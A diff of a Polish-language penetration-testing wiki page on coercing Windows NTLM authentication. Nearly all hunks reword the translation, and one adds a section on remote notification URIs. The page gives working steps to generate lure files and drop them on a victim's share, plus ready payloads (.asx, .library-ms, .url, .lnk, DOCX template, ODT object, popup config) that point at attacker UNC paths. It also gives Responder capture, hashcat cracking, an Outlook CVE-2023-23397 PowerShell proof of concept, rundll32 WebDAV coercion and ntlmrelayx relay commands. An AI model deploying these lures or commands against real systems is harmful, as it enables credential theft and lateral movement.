@@ -2,13 +2,13 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Sprawdź wszystkie świetne pomysły z [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), od pobierania pliku Microsoft Word z internetu po źródło wycieków NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md oraz [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
+**Sprawdź wszystkie świetne pomysły z [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), od pobrania pliku Microsoft Word z Internetu po źródło wycieków NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md oraz [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
 
-### Zapisywalny udział SMB + przynęty UNC wywoływane przez Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)
+### Zapisywalny udział SMB + przynęty UNC wyzwalane przez Eksplorator (ntlm_theft/SCF/LNK/library-ms/desktop.ini)
 
-Jeśli możesz **zapisywać w udziale przeglądanym w Explorerze przez użytkowników lub zadania zaplanowane**, umieść tam pliki, których metadane wskazują na twój UNC (np. `\\ATTACKER\share`). Wyświetlenie zawartości folderu wywoła **niejawną autentykację SMB** i ujawni **NetNTLMv2** nasłuchującemu listenerowi.<sup>[[1]](#references)</sup>
+Jeśli możesz **zapisywać w udziale przeglądanym w Eksploratorze przez użytkowników lub zaplanowane zadania**, umieść pliki, których metadane wskazują na Twój UNC (np. `\\ATTACKER\share`). Wyświetlenie folderu wyzwala **niejawną autentykację SMB** i ujawnia **NetNTLMv2** naszemu listenerowi.<sup>[[1]](#references)</sup>
 
-1. **Wygeneruj przynęty** (obejmuje SCF/URL/LNK/library-ms/desktop.ini/Office/RTF itd.)
+1. **Wygeneruj przynęty** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF itp.)
 
 ```bash
 git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
@@ -16,7 +16,7 @@ uv add --script ntlm_theft.py xlsxwriter
 uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
 ```
 
-2. **Upuść je na zapisywalnym udziale** (w dowolnym folderze, który ofiara otwiera):
+2. **Umieść je w udziale z prawem zapisu** (w dowolnym folderze, który ofiara otworzy):
 
 ```bash
 smbclient //victim/share -U 'guest%'
@@ -25,18 +25,18 @@ prompt off
 mput lure/*
 ```
 
-3. **Nasłuchuj i crackuj**:
+3. **Nasłuchuj i łam**:
 
 ```bash
 sudo responder -I <iface>          # capture NetNTLMv2
 hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
 ```
 
-Windows może uzyskać dostęp do kilku plików jednocześnie; w przypadku wszystkiego, co Explorer wyświetla w podglądzie (`BROWSE TO FOLDER`), nie trzeba klikać.
+Windows może jednocześnie otworzyć kilka plików; do wszystkiego, co Explorer wyświetla w podglądzie (`BROWSE TO FOLDER`), nie trzeba klikać.
 
 ### Playlisty Windows Media Player (.ASX/.WAX)
 
-Jeśli uda Ci się nakłonić cel do otwarcia lub wyświetlenia podglądu kontrolowanej przez Ciebie playlisty Windows Media Player, możesz doprowadzić do wycieku Net‑NTLMv2, wskazując ścieżkę UNC. WMP spróbuje pobrać wskazany plik multimedialny przez SMB i automatycznie się uwierzytelni.<sup>[[3]](#references)[[4]](#references)</sup>
+Jeśli uda Ci się nakłonić cel do otwarcia lub wyświetlenia podglądu kontrolowanej przez Ciebie playlisty Windows Media Player, możesz leak Net-NTLMv2, wskazując ścieżkę UNC jako wpis playlisty. WMP spróbuje pobrać wskazany plik multimedialny przez SMB i automatycznie się uwierzytelni.<sup>[[3]](#references)[[4]](#references)</sup>
 
 Przykładowy payload:
 
@@ -50,7 +50,7 @@ Przykładowy payload:
 </asx>
 ```
 
-Proces zbierania i łamania:
+Przebieg zbierania i crackingu:
 
 ```bash
 # Capture the authentication
@@ -60,9 +60,9 @@ sudo Responder -I <iface>
 hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
 ```
 
-### .library-ms osadzony w ZIP — NTLM leak (CVE-2025-24071/24055)
+### Wyciek NTLM przez plik .library-ms osadzony w ZIP-ie (CVE-2025-24071/24055)
 
-Windows Explorer niebezpiecznie obsługuje pliki .library-ms otwierane bezpośrednio z archiwum ZIP. Jeśli definicja biblioteki wskazuje zdalną ścieżkę UNC (np. \\attacker\share), samo przeglądanie lub uruchomienie pliku .library-ms w archiwum ZIP powoduje, że Explorer enumeruje ścieżkę UNC i wysyła do atakującego dane uwierzytelniające NTLM. W ten sposób uzyskuje się NetNTLMv2, które można złamać offline lub potencjalnie przekazać dalej.<sup>[[2]](#references)</sup>
+Windows Explorer niebezpiecznie obsługuje pliki .library-ms otwierane bezpośrednio z archiwum ZIP. Jeśli definicja biblioteki wskazuje na zdalną ścieżkę UNC (np. \\attacker\share), samo przeglądanie lub uruchomienie pliku .library-ms z archiwum powoduje, że Explorer odpytuje ścieżkę UNC i wysyła do atakującego dane uwierzytelniające NTLM. W ten sposób można uzyskać NetNTLMv2, które można złamać offline lub potencjalnie przekazać dalej.<sup>[[2]](#references)</sup>
 
 Minimalny plik .library-ms wskazujący na UNC atakującego
 
@@ -87,14 +87,13 @@ Minimalny plik .library-ms wskazujący na UNC atakującego
 ```
 
 Kroki operacyjne
-- Utwórz plik .library-ms z powyższym XML (ustaw swoje IP/nazwę hosta).
-- Spakuj go do ZIP (w Windows: Wyślij do → Folder skompresowany (zip)) i dostarcz ZIP celowi.
-- Uruchom listener przechwytujący NTLM i poczekaj, aż ofiara otworzy plik .library-ms z ZIP-a.
+- Utwórz plik .library-ms z powyższym XML-em (ustaw swój adres IP/nazwę hosta).
+- Spakuj go do ZIP-a (w Windows: Wyślij do → Folder skompresowany (zip)) i dostarcz archiwum celowi.
+- Uruchom listener przechwytujący NTLM i poczekaj, aż ofiara otworzy plik .library-ms z archiwum ZIP.
 
+### Ścieżka dźwięku przypomnienia kalendarza Outlook (CVE-2023-23397) – zero-click Net-NTLMv2 leak
 
-### Ścieżka dźwięku przypomnienia kalendarza w Outlooku (CVE-2023-23397) – zero-click Net-NTLMv2 leak
-
-Microsoft Outlook dla Windows przetwarzał rozszerzoną właściwość MAPI PidLidReminderFileParameter w elementach kalendarza. Jeśli ta właściwość wskazywała ścieżkę UNC (np. \\attacker\share\alert.wav), Outlook łączył się z udziałem SMB, gdy uruchamiało się przypomnienie, powodując leak Net-NTLMv2 użytkownika bez żadnego kliknięcia. Luka została załatana 14 marca 2023 r., ale nadal ma duże znaczenie w przypadku starszych/nieaktualizowanych środowisk oraz podczas analizy historycznych incydentów.<sup>[[5]](#references)</sup>
+Microsoft Outlook dla Windows przetwarzał rozszerzoną właściwość MAPI PidLidReminderFileParameter w elementach kalendarza. Jeśli ta właściwość wskazywała ścieżkę UNC (np. \\attacker\share\alert.wav), Outlook łączył się z udziałem SMB po uruchomieniu przypomnienia, powodując leak danych Net-NTLMv2 użytkownika bez żadnego kliknięcia. Poprawkę wydano 14 marca 2023 r., ale problem nadal ma duże znaczenie w przypadku starszych/niezaktualizowanych środowisk oraz przy analizie historycznych incydentów.<sup>[[5]](#references)</sup>
 
 Szybkie wykorzystanie za pomocą PowerShell (Outlook COM):
 
@@ -105,7 +104,7 @@ Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\
 # Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
 ```
 
-Po stronie listenera:
+Po stronie nasłuchującej:
 
 ```bash
 sudo responder -I eth0  # or impacket-smbserver to observe connections
@@ -116,9 +115,9 @@ Notatki
 - leak ujawnia Net‑NTLMv2, który nadaje się do łamania offline lub relay (nie pass-the-hash).
 
 
-### .LNK/.URL zero-click NTLM leak oparty na ikonach (CVE‑2025‑50154 – obejście CVE‑2025‑24054)
+### leak NTLM typu zero-click oparty na ikonie .LNK/.URL (CVE‑2025‑50154 – obejście CVE‑2025‑24054)
 
-Windows Explorer automatycznie renderuje ikony skrótów. Niedawne badania wykazały, że nawet po poprawce Microsoftu z kwietnia 2025 r. dotyczącej skrótów z ikonami UNC nadal można było wywołać uwierzytelnianie NTLM bez żadnych kliknięć, umieszczając cel skrótu w ścieżce UNC i pozostawiając ikonę lokalnie (obejściu poprawki przypisano CVE‑2025‑50154). Samo wyświetlenie folderu powoduje, że Explorer pobiera metadane ze zdalnego celu, wysyłając NTLM do serwera SMB atakującego.<sup>[[6]](#references)</sup>
+Eksplorator Windows automatycznie renderuje ikony skrótów. Niedawne badania wykazały, że nawet po poprawce Microsoftu z kwietnia 2025 r. dotyczącej skrótów z ikonami UNC nadal można było wywołać uwierzytelnianie NTLM bez kliknięć, hostując cel skrótu w ścieżce UNC i pozostawiając ikonę lokalnie (obejście poprawki otrzymało oznaczenie CVE‑2025‑50154). Samo wyświetlenie folderu powoduje, że Eksplorator pobiera metadane ze zdalnego celu, wysyłając NTLM na serwer SMB atakującego.<sup>[[6]](#references)</sup>
 
 Minimalny payload Internet Shortcut (.url):
 
@@ -129,7 +128,7 @@ IconFile=\\10.10.14.2\share\icon.ico
 IconIndex=0
 ```
 
-Payload skrótu (.lnk) za pomocą PowerShell:
+Payload skrótu programu (.lnk) za pomocą PowerShell:
 
 ```powershell
 $lnk = "$env:USERPROFILE\Desktop\lab.lnk"
@@ -141,54 +140,68 @@ $sc.Save()
 ```
 
 Pomysły na dostarczenie
-- Umieść skrót w pliku ZIP i skłoń ofiarę do jego otwarcia.
-- Umieść skrót na zapisywalnym udziale, który ofiara otworzy.
-- Połącz go z innymi plikami-przynętami w tym samym folderze, aby Explorer wyświetlił podgląd elementów.
+- Umieść skrót w pliku ZIP i nakłoń ofiarę do jego przeglądania.
+- Umieść skrót w zapisywalnym udziale, który ofiara otworzy.
+- Połącz go z innymi plikami-przynętami w tym samym folderze, aby Eksplorator wyświetlał ich podgląd.
 
-### No-click .LNK leak NTLM przez ścieżkę ikony ExtraData (CVE‑2026‑25185)
+### Wyciek NTLM bez kliknięcia przez ścieżkę ikony ExtraData w pliku .LNK (CVE‑2026‑25185)
 
-Windows wczytuje metadane `.lnk` podczas **wyświetlania/podglądu** (renderowania ikony), a nie tylko podczas uruchamiania. CVE‑2026‑25185 pokazuje ścieżkę przetwarzania, w której bloki **ExtraData** powodują, że powłoka rozpoznaje ścieżkę ikony i uzyskuje dostęp do systemu plików **podczas wczytywania**, wysyłając wychodzące NTLM, gdy ścieżka jest zdalna.
+Windows ładuje metadane `.lnk` podczas **wyświetlania/podglądu** (renderowania ikony), a nie tylko podczas uruchamiania. CVE‑2026‑25185 pokazuje ścieżkę parsowania, w której bloki **ExtraData** powodują, że powłoka rozpoznaje ścieżkę ikony i uzyskuje dostęp do systemu plików **podczas ładowania**, wysyłając wychodzące uwierzytelnienie NTLM, jeśli ścieżka jest zdalna.
 
-Najważniejsze warunki wyzwalające (zaobserwowane w `CShellLink::_LoadFromStream`):
+Kluczowe warunki wyzwalające (zaobserwowane w `CShellLink::_LoadFromStream`):
 - Uwzględnij **DARWIN_PROPS** (`0xa0000006`) w ExtraData (warunek uruchomienia procedury aktualizacji ikony).
-- Uwzględnij **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) z wypełnionym polem **TargetUnicode**.
-- Program wczytujący rozwija zmienne środowiskowe w `TargetUnicode` i wywołuje `PathFileExistsW` dla uzyskanej ścieżki.
+- Uwzględnij **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) z wypełnionym **TargetUnicode**.
+- Program ładujący rozwija zmienne środowiskowe w `TargetUnicode` i wywołuje `PathFileExistsW` dla uzyskanej ścieżki.
 
-Jeśli `TargetUnicode` wskazuje ścieżkę UNC (np. `\\attacker\share\icon.ico`), **samo wyświetlenie folderu** zawierającego skrót powoduje uwierzytelnianie wychodzące. Ta sama ścieżka wczytywania może zostać uruchomiona przez **indeksowanie** i skanowanie AV, co czyni ją praktyczną powierzchnią ataku typu no-click umożliwiającą leak.<sup>[[7]](#references)</sup>
+Jeśli `TargetUnicode` wskazuje ścieżkę UNC (np. `\\attacker\share\icon.ico`), **samo wyświetlenie folderu** zawierającego skrót powoduje wychodzące uwierzytelnienie. Ta sama ścieżka ładowania może zostać uruchomiona także przez **indeksowanie** i **skanowanie przez AV**, co tworzy praktyczną powierzchnię wycieku bez kliknięcia.<sup>[[7]](#references)</sup>
 
-Narzędzia badawcze (parser/generator/UI) są dostępne w projekcie **LnkMeMaybe** i pozwalają tworzyć oraz analizować te struktury bez użycia interfejsu graficznego Windows.<sup>[[8]](#references)</sup>
+Narzędzia badawcze (parser/generator/interfejs użytkownika) do tworzenia i analizowania tych struktur bez używania interfejsu graficznego Windows są dostępne w projekcie **LnkMeMaybe**.<sup>[[8]](#references)</sup>
 
 
-### Wymuszanie uwierzytelniania WebDAV / weryfikacja poświadczeń przez `davclnt.dll,DavSetCookie`
+### Wymuszenie uwierzytelnienia WebDAV / weryfikacja poświadczeń przez `davclnt.dll,DavSetCookie`
 
-Natywnego **klienta WebDAV** można nadużyć, aby wymusić uwierzytelnienie bieżącej sesji logowania na dowolnym punkcie końcowym **HTTP/WebDAV**:
+Natywnego **klienta WebDAV** można użyć do wymuszenia uwierzytelnienia bieżącej sesji logowania wobec dowolnego punktu końcowego **HTTP/WebDAV**:
 
 ```cmd
 rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
 ```
 
-Dlaczego jest to przydatne:
-- W przypadku **serwera WebDAV kontrolowanego przez atakującego** może wywołać **NTLM przez HTTP** bez uruchamiania własnego klienta.
-- W przypadku **hostów wewnętrznych** to dyskretny sposób na **sprawdzenie, gdzie skradzione poświadczenia są akceptowane**, zanim nastąpi ruch lateralny.<sup>[[9]](#references)</sup>
-- To polecenie jest dobrą alternatywą, gdy **ruch wychodzący SMB jest filtrowany**, ale **HTTP/WebDAV** jest nadal osiągalny.
+Dlaczego to przydatne:
+- W przypadku **serwera WebDAV kontrolowanego przez atakującego** może wywołać **NTLM przez HTTP** bez wdrażania własnego klienta.
+- W przypadku **hostów wewnętrznych** to dyskretny sposób na **sprawdzenie, gdzie skradzione dane uwierzytelniające są akceptowane** przed rozpoczęciem ruchu lateralnego.<sup>[[9]](#references)</sup>
+- To polecenie jest dobrą alternatywą, gdy **ruch wychodzący SMB jest filtrowany**, ale **HTTP/WebDAV** jest nadal dostępny.
 
 Uwagi operacyjne:
 - Usługa **WebClient** musi być uruchomiona na hoście źródłowym.
-- `rundll32.exe` ładuje `davclnt.dll` i zleca systemowi Windows obsługę uwierzytelniania WebDAV przy użyciu **poświadczeń bieżącego użytkownika**.<sup>[[10]](#references)</sup>
-- Jeśli kierujesz ruch do infrastruktury, którą kontrolujesz, użyj nasłuchującego serwera HTTP obsługującego NTLM lub przekaźnika, takiego jak:
+- `rundll32.exe` ładuje `davclnt.dll` i sprawia, że system Windows obsługuje uwierzytelnianie WebDAV przy użyciu **danych uwierzytelniających bieżącego użytkownika**.<sup>[[10]](#references)</sup>
+- Jeśli kierujesz ruch do kontrolowanej przez siebie infrastruktury, użyj nasłuchującego/relay HTTP obsługującego NTLM, na przykład:
 
 ```bash
 # Capture or relay NTLM over HTTP/WebDAV
 ntlmrelayx.py -t smb://<TARGET> --http-port 80
 ```
 
-Z perspektywy detekcji wielokrotne uruchomienia `rundll32.exe davclnt.dll,DavSetCookie` skierowane do wielu systemów wewnętrznych są silnym sygnałem **przygotowań do walidacji poświadczeń / ruchu bocznego przypominającego spray**, a nie normalnego zachowania użytkownika.<sup>[[9]](#references)[[11]](#references)</sup>
+Z perspektywy wykrywania wielokrotne uruchomienia `rundll32.exe davclnt.dll,DavSetCookie` w odniesieniu do wielu systemów wewnętrznych są wyraźnym sygnałem **weryfikacji poświadczeń / przygotowań do ruchu lateralnego przypominających spray**, a nie normalnego zachowania użytkownika.<sup>[[9]](#references)[[11]](#references)</sup>
 
-### Office remote template injection (.docx/.dotm) to coerce NTLM
+### Zdalne URI powiadomień do wymuszania uwierzytelniania NTLM przez WebDAV
 
-Dokumenty Office mogą odwoływać się do zewnętrznego szablonu. Jeśli jako dołączony szablon ustawisz ścieżkę UNC, otwarcie dokumentu spowoduje uwierzytelnienie przez SMB.
+Jeśli aplikacja otwiera zdalnie skonfigurowane adresy wyskakujących okienek lub widoków internetowych, adres `file://` może wymusić uwierzytelnianie wychodzące **bez otwierania dokumentu ani ładunku wykonywalnego**. W przypadku AOMEI powiadomienie o rozmiarze jednego piksela wskazywało zdalną ścieżkę WebDAV `DavWWWRoot`. System Windows próbował użyć zintegrowanego uwierzytelniania dla tego adresu, ujawniając odpowiedź na wyzwanie NetNTLMv2. Wyzwalaczem było otwarcie URI, a nie widoczność wyskakującego okienka; działanie nadal zależy od procedury obsługi URI w aplikacji, [działania Windows WebClient](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution) oraz zasad uwierzytelniania wychodzącego.<sup>[[16]](#references)</sup>
 
-Minimalne zmiany relacji DOCX (wewnątrz word/):
+```ini
+[PopWindow1]
+Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
+Width=1
+Height=1
+Priority=9999
+```
+
+W przeciwieństwie do opisanej wyżej metody wymuszania uwierzytelniania za pomocą poleceń, ten punkt wejścia wymaga kontroli nad [konfiguracją powiadomień oprogramowania](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). Jednopikselowe okno i wysoki priorytet pokazują, że nawet niepozorne powiadomienie może sprawić, że klient odwoła się do URI.<sup>[[16]](#references)</sup>
+
+### Wstrzyknięcie zdalnego szablonu Office (.docx/.dotm) w celu wymuszenia NTLM
+
+Dokumenty Office mogą odwoływać się do zewnętrznego szablonu. Jeśli ustawisz dołączony szablon na ścieżkę UNC, otwarcie dokumentu spowoduje uwierzytelnienie przez SMB.
+
+Minimalne zmiany w relacjach DOCX (wewnątrz word/):
 
 1) Edytuj word/settings.xml i dodaj odwołanie do dołączonego szablonu:
 
@@ -202,17 +215,17 @@ Minimalne zmiany relacji DOCX (wewnątrz word/):
 <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
 ```
 
-3) Przepakuj do .docx i dostarcz. Uruchom listener do przechwytywania SMB i poczekaj, aż dokument zostanie otwarty.
+3) Spakuj ponownie do .docx i dostarcz. Uruchom nasłuchujący SMB capture listener i poczekaj, aż plik zostanie otwarty.
 
 ### Zewnętrzny obiekt ODT do uwierzytelniania SMB
 
-Gdy ścieżka przesyłania dokumentów akceptuje `.odt`, ale cel nie otwiera plików Office `.docx`, użyj zewnętrznego obiektu OpenDocument zamiast szablonu Office. Metasploitowe `auxiliary/fileformat/odt_badodt` generuje plik ODT, którego `content.xml` zawiera odwołanie `draw:object` wykonywane przy otwarciu, takie jak poniższe. Ustaw `LHOST` na adres listenera SMB, prześlij plik ODT dozwoloną ścieżką i przechwyć odpowiedź NetNTLMv2 po otwarciu dokumentu przez użytkownika lub procesor dokumentów. Kontrola rozszerzenia pliku nie sprawdza osadzonego adresu URL; ograniczenia NTLM ruchu przychodzącego na celu niekoniecznie zatrzymują uwierzytelnianie wychodzące.<sup>[[15]](#references)</sup>
+Gdy ścieżka przesyłania dokumentów akceptuje `.odt`, ale cel nie otwiera plików Office `.docx`, użyj zewnętrznego obiektu OpenDocument zamiast szablonu Office. Moduł Metasploit `auxiliary/fileformat/odt_badodt` generuje plik ODT, którego `content.xml` zawiera odwołanie `draw:object` uruchamiane przy otwarciu, takie jak poniższe. Ustaw `LHOST` na adres SMB listenera, prześlij ODT dozwoloną ścieżką i przechwyć odpowiedź NetNTLMv2 przychodzącą z sieci, gdy użytkownik lub procesor dokumentów otworzy plik. Kontrola rozszerzenia nazwy pliku nie sprawdza osadzonego adresu URL; ograniczenia przychodzącego NTLM na celu nie muszą blokować uwierzytelniania wychodzącego.<sup>[[15]](#references)</sup>
 
 ```xml
 <draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
 ```
 
-Wskazówki dotyczące dalszych działań po przechwyceniu, takich jak relay lub nadużywanie NTLM, znajdziesz tutaj:
+Pomysły na działania po przechwyceniu, takie jak relay lub nadużywanie NTLM, znajdziesz w:
 
 {{#ref}}
 README.md
@@ -220,18 +233,19 @@ README.md
 
 
 ## References
-- [1] [HTB: Breach – Przynęty na zapisywalnym udziale + przechwycenie przez Responder → złamanie NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
-- [2] [HTB Fluffy – wyciek uwierzytelnienia z ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 do DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
-- [3] [HTB: Media — wyciek NTLM z WMP → junction NTFS do webroota, RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
-- [4] [Morphisec – 5 luk w NTLM: niezałatane zagrożenia eskalacją uprawnień w Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
-- [5] [MSRC – Microsoft łagodzi lukę EoP w Outlooku (CVE‑2023‑23397) i wyjaśnia wyciek NTLM przez PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
-- [6] [Cymulate – zero-click, jeden NTLM: obejście poprawki zabezpieczeń Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
-- [7] [TrustedSec – LnkMeMaybe: omówienie CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
+- [1] [HTB: Breach – Przynęty na zapisywalnym udziale + przechwycenie Respondera → crack NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
+- [2] [HTB Fluffy – leak uwierzytelniania ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 do DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
+- [3] [HTB: Media — leak NTLM przez WMP → junction NTFS do webroot RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [4] [Morphisec – 5 podatności NTLM: niezałatane zagrożenia eskalacją uprawnień w Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
+- [5] [MSRC – Microsoft łagodzi podatność Outlook EoP (CVE‑2023‑23397) i wyjaśnia leak NTLM przez PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
+- [6] [Cymulate – Zero-click, jeden NTLM: obejście poprawki zabezpieczeń Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
+- [7] [TrustedSec – LnkMeMaybe: przegląd CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
 - [8] [Narzędzie TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
-- [9] [Rapid7 – Gdy dzwoni dział IT: analiza kampanii ModeloRAT od Teams do przejęcia domeny](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
-- [10] [Microsoft Learn – plik nagłówkowy davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
-- [11] [Splunk – żądanie WebDAV z Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
-- [12] [osandamalith.com - Miejsca warte uwagi przy kradzieży hashy NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
-- [13] [p0dalirius/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
+- [9] [Rapid7 – Gdy dzwoni dział IT Support: analiza kampanii ModeloRAT, od Teams do przejęcia domeny](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
+- [10] [Microsoft Learn – nagłówek davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
+- [11] [Splunk – żądanie WebDAV przez Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
+- [12] [osandamalith.com - Ciekawe miejsca do kradzieży hashy NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
+- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
 - [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
-- [15] [HTB: Hercules — przechwycenie NTLM przez zewnętrzny obiekt ODT](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
+- [15] [HTB: Hercules — przechwycenie NTLM przez obiekt zewnętrzny ODT](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
+- [16] [Google Threat Intelligence Group i Mandiant – badanie krótkotrwałego manipulowania łańcuchem dostaw](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
